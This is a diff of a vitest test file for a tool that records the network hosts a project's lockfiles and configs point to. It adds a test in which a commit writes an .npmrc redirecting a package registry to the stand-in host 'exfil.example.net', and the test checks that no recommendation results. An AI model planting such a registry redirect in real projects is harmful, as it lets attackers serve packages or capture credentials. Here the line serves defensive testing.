@@ -1,15 +1,16 @@
 import { execFileSync } from 'node:child_process';
 import { mkdirSync, writeFileSync } from 'node:fs';
 import { dirname, join } from 'node:path';
-import { createTestStore, deleteAppSetting, listPermissionRules, seedProject } from '@10db/db';
+import {
+  createTestStore,
+  deleteAppSetting,
+  listPermissionRules,
+  patchProject,
+  seedProject,
+} from '@10db/db';
 import type { Store } from '@10db/db';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
-import {
-  createTempRepo,
-  createTempRepoWithOrigin,
-  isolatedGitEnv,
-  type TempDir,
-} from '../../test/fixtures';
+import { createTempRepoWithOrigin, isolatedGitEnv, type TempDir } from '../../test/fixtures';
 import { createEventBus, createStateStore, type StateStore } from '../events';
 import { createGit } from '../git';
 import { createInboxService, raiseGateHostCards } from '../inbox';
@@ -32,15 +33,17 @@ let store: Store;
 let state: StateStore;
 let bus: ReturnType<typeof createEventBus>;
 let repo: TempDir;
+let origin: ReturnType<typeof createTempRepoWithOrigin>;
 beforeEach(() => {
   ({ store, close } = createTestStore());
   bus = createEventBus();
   state = createStateStore(store, bus);
-  repo = createTempRepo();
+  origin = createTempRepoWithOrigin();
+  repo = origin.repo;
 });
 afterEach(() => {
   close();
-  repo.cleanup();
+  origin.cleanup();
 });
 
 const run = (...args: string[]) =>
@@ -52,10 +55,12 @@ function write(name: string, text: string): void {
   writeFileSync(path, text);
 }
 
+/** Commits on the checked-out branch and publishes `main`, so origin's copy of it is the one a reading takes. */
 function commit(name: string, text: string): void {
   write(name, text);
   run('add', '--force', name);
   run('commit', '-q', '-m', `add ${name}`);
+  run('push', '-q', 'origin', 'main');
 }
 
 /** A project added before 10db kept a reading: its checkout is `repo`, and no reading was ever written. */
@@ -182,6 +187,7 @@ describe('taking a reading for a project added before 10db kept one', () => {
     run('branch', 'nope');
     commit('Cargo.lock', CRATES);
     run('branch', '-f', 'nope', 'main');
+    run('push', '-q', 'origin', 'nope');
     await take(project.id);
     expect(readFoundHosts(state.db, project.id).map((f) => f.host)).toEqual([
       'index.crates.io',
@@ -214,16 +220,6 @@ describe('taking a reading for a project added before 10db kept one', () => {
 });
 
 describe('under local delivery', () => {
-  let origin: ReturnType<typeof createTempRepoWithOrigin>;
-  beforeEach(() => {
-    repo.cleanup();
-    origin = createTempRepoWithOrigin();
-    repo = origin.repo;
-  });
-  afterEach(() => {
-    origin.origin.cleanup();
-  });
-
   it('reads origin’s copy of the default branch', async () => {
     commit('Cargo.lock', CRATES);
     run('push', '-q', 'origin', 'main');
@@ -258,6 +254,40 @@ describe('under local delivery', () => {
       'index.crates.io',
       'static.crates.io',
     ]);
+  });
+
+  it('recommends nothing from a lane’s commit on main after the project switches to pull_request delivery', async () => {
+    // The lane committed on main while the project was local; no reading was taken, and origin has no copy of main.
+    run('update-ref', '-d', 'refs/remotes/origin/main');
+    write('.npmrc', '@x:registry=https://exfil.example.net/\n');
+    await git.commit({
+      repo: repo.path,
+      paths: ['.npmrc'],
+      message: 'registry',
+      opId: 'op-lane-npmrc-switch',
+      branch: 'main',
+    });
+    const project = oldProject('local');
+    state.write((ctx) => {
+      patchProject(ctx, project.id, { delivery: 'pull_request' });
+    });
+    const inbox = createInboxService({ state, onParkedAnswer: () => undefined });
+
+    await take(project.id);
+    const [card] = raiseGateHostCards(
+      { state, inbox },
+      {
+        projectId: project.id,
+        run: BlockedRun.Gate,
+        command: 'npm install',
+        hosts: ['exfil.example.net'],
+      },
+    );
+
+    expect(foundHostFile(state.db, project.id, 'exfil.example.net')).toBeNull();
+    expect(readFoundHosts(state.db, project.id)).toEqual([]);
+    expect(card?.recommendation).toBeNull();
+    expect(card?.body).not.toContain('.npmrc');
   });
 
   it('takes no reading when origin has no copy of the default branch', async () => {
